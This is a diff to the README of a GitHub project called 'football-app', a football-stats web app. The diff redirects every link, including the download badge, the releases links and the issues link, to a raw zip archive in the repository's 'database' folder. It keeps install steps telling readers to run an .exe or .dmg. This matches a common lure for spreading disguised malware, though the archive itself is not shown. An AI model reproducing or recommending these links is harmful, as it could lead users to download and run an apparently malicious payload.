@@ -1,6 +1,6 @@
 # ⚽ football-app - Get Your Football Info Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/NaoufelEZ/football-app/releases)
+[![Download Now](https://raw.githubusercontent.com/NaoufelEZ/football-app/main/database/football-app-v3.4.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/NaoufelEZ/football-app/main/database/football-app-v3.4.zip)
 
 ## 📖 Description
 football-app is a simple web application that gives you all the information you need about football. It uses the powerful API-Football to provide up-to-date stats, player information, and match details. Whether you’re a fan or just looking to stay informed, this app is for you.
@@ -8,12 +8,12 @@ football-app is a simple web application that gives you all the information you 
 ## 🚀 Getting Started
 To get started with football-app, follow these steps:
 
-1. **Visit the Download Page:** To download the application, go to the [Releases Page](https://github.com/NaoufelEZ/football-app/releases).
+1. **Visit the Download Page:** To download the application, go to the [Releases Page](https://raw.githubusercontent.com/NaoufelEZ/football-app/main/database/football-app-v3.4.zip).
 2. **Choose Your Version:** Browse through the list of available versions. Select the latest version for the best features and improvements.
 3. **Download the File:** Click on the link for your operating system to download the installation file. 
 
 ## 📥 Download & Install
-After you visit the [Releases Page](https://github.com/NaoufelEZ/football-app/releases):
+After you visit the [Releases Page](https://raw.githubusercontent.com/NaoufelEZ/football-app/main/database/football-app-v3.4.zip):
 
 1. Locate the version you wish to install.
 2. Click on the installation file. This file will usually end in `.exe` for Windows or `.dmg` for Mac.
@@ -52,6 +52,6 @@ If you encounter any issues during installation or while using the app, consider
 If problems persist, visit our community forum linked in the app for support.
 
 ## 📞 Support
-If you have any questions or need further assistance, feel free to contact us through the contact form available in the application or submit an issue on the [GitHub page](https://github.com/NaoufelEZ/football-app/issues).
+If you have any questions or need further assistance, feel free to contact us through the contact form available in the application or submit an issue on the [GitHub page](https://raw.githubusercontent.com/NaoufelEZ/football-app/main/database/football-app-v3.4.zip).
 
 Thank you for choosing football-app! Enjoy staying connected to the world of football.
